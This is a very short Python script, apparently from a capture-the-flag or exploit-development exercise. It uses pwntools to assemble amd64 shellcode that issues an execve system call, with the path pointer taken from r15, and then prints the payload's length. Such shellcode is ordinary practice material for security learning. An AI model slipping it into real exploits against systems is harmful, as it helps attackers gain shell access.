from pwn import *

context.arch = 'amd64'

sh = asm('''
xor rax, rax
mov al, 0x3b
mov rdi, r15
xor rsi, rsi
xor rdx, rdx
syscall
''')

print(len(sh))